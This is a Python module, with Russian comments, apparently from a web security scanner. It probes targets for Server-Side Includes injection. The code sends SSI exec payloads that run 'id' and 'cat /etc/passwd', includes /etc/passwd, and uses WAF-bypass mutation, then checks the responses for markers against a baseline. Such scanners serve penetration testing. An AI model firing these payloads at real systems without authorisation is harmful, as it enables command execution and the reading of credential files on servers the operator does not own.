"""ssi_injection v2 — baseline-aware SSI (Server-Side Includes) probes.

v1 маркеры ("uid=", "root:x:0:0") встречаются в baseline → ложные срабатывания.
v2: строгие маркеры + baseline check + verify.
"""
from core.http import HttpClient
from core.verify import verify, confidence, is_signal
from core.waf_bypass import mutate_until_pass

# строгие SSI-маркеры, специфичные для исполнения SSI
MARKERS = [
    "uid=",                    # `id` — но только если в ответе есть `uid=\d+(`
    "gid=",                    # `id` полный
    "groups=",                 # `id` extended
    "HTTP_USER_AGENT=",        # <!--#echo var="HTTP_USER_AGENT"-->
    "DOCUMENT_ROOT=/",         # <!--#echo var="DOCUMENT_ROOT"-->
    "SERVER_SOFTWARE=",        # <!--#echo var="SERVER_SOFTWARE"-->
    "REMOTE_ADDR=",            # <!--#echo var="REMOTE_ADDR"-->
    "SERVER_NAME=",            # <!--#echo var="SERVER_NAME"-->
    "SERVER_PORT=",            # <!--#echo var="SERVER_PORT"-->
    "root:x:0:0:root:",        # <!--#include virtual="/etc/passwd"-->
]

# payload'ы — SSI exec/echo/include
PAYLOADS = [
    '<!--#exec cmd="id"-->',
    '<!--#exec cmd="id;uname -a"-->',
    '<!--#exec cmd="cat /etc/passwd"-->',
    '<!--#echo var="DATE_LOCAL"-->',
    '<!--#echo var="HTTP_USER_AGENT"-->',
    '<!--#echo var="DOCUMENT_ROOT"-->',
    '<!--#echo var="SERVER_SOFTWARE"-->',
    '<!--#echo var="REMOTE_ADDR"-->',
    '<!--#include virtual="/etc/passwd"-->',
    '<!--#include file="/etc/passwd"-->',
    '<!--#printenv -->',
    '<!--#config errmsg="SSI_ON" -->',
]


class SsiInjection:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        # === baseline: чистый запрос — отсеиваем маркеры, уже присутствующие ===
        baseline_text = ""
        try:
            base_r = http.get(target)
            if base_r:
                baseline_text = (base_r.text or "").lower()
                print(f"[ssi v2] baseline: {base_r.status_code} {len(baseline_text)}b")
        except Exception:
            pass

        active_markers = [m for m in MARKERS if m.lower() not in baseline_text]
        if not active_markers:
            print("[ssi v2] all markers already in baseline — skip")
            return {"findings": []}

        findings = []

        for payload in PAYLOADS:
            # WAF-обход
            result = mutate_until_pass(
                http,
                target + ("&" if "?" in target else "?") + "x=" + payload,
                payload,
                method="GET",
            )
            r = result["response"]
            if not r:
                continue

            low = (r.text or "").lower()
            hit = None
            for m in active_markers:
                if m.lower() in low:
                    hit = m
                    break

            if not hit:
                continue

            # === verify ×2 ===
            def rep():
                try:
                    return http.get(target + ("&" if "?" in target else "?") + "x=" + payload)
                except Exception:
                    return None

            def predicate(s):
                body_low = (s.get("body", "") or "").lower()
                return any(m.lower() in body_low for m in active_markers)

            ratio, hits = verify(rep, predicate, n=2, delay=0.2)

            # confidence — высокий для exec/include (содержимое файла), ниже для echo
            if hit in ("root:x:0:0:root:",) or "uid=" in hit:
                strength, sev = 0.95, "critical"
            else:
                strength, sev = 0.75, "high"

            conf = confidence(strength, ratio)
            if not is_signal(conf, floor=0.55, module="ssi_injection"):
                continue

            findings.append({
                "payload": payload[:80],
                "marker": hit,
                "severity": sev,
                "verify_hits": hits,
                "confidence": conf,
            })
            print(f"  ✓ SSI {sev}: {hit}")
            logger.finding("ssi_injection", sev,
                           f"marker={hit} conf={int(conf*100)}")
            break  # достаточно одного подтверждения

        print(f"[ssi v2] findings: {len(findings)}")
        return {"findings": findings}
